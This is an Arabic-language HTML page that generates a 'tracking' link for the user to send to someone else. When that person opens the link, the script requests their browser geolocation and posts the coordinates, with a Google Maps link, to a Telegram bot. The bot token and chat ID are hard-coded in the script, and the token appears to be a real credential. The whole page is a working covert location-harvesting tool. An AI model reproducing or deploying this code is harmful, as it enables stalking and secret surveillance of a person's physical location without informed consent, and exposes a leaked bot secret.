<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>إنشاء رابط</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f3f3;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 12px;
      border: none;
      background-color: #141B3D;
      color: white;
      cursor: pointer;
      margin-top: 20px;
    }
    #linkBox {
      margin-top: 20px;
      background: #fff;
      padding: 15px;
      border-radius: 10px;
      display: none;
      word-break: break-all;
    }
  </style>
</head>
<body>

  <h1>إنشاء رابط</h1>
  <button onclick="generateLink()">إنشاء الرابط</button>

  <div id="linkBox">
    <p>انسخ الرابط وارسله:</p>
    <div id="generatedLink"></div>
  </div>

  <script>
    function generateLink() {
      const link = window.location.href + "?track=true";
      document.getElementById('generatedLink').innerText = link;
      document.getElementById('linkBox').style.display = "block";
    }

    async function sendLocationToTelegram(lat, lon) {
      const token = "7674029114:AAHaq4rCkgM8qmfijdQ7L-uYiRnG7HJqdZk";
      const chat_id = "7037026615";
      const message = `🛰️ تم تحديد موقع جديد:\n\n📍 الإحداثيات:\nLatitude: ${lat}\nLongitude: ${lon}\n\n🌍 https://www.google.com/maps?q=${lat},${lon}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      });
    }

    function requestLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            sendLocationToTelegram(lat, lon);
          },
          (error) => {
            alert("حدث خطأ في تحديد الموقع أو تم الرفض.");
          }
        );
      } else {
        alert("المتصفح لا يدعم تحديد الموقع.");
      }
    }

    // تحقق إذا كان الرابط يحتوي على track
    const params = new URLSearchParams(window.location.search);
    if (params.has("track")) {
      requestLocation();
    }
  </script>

</body>
</html>
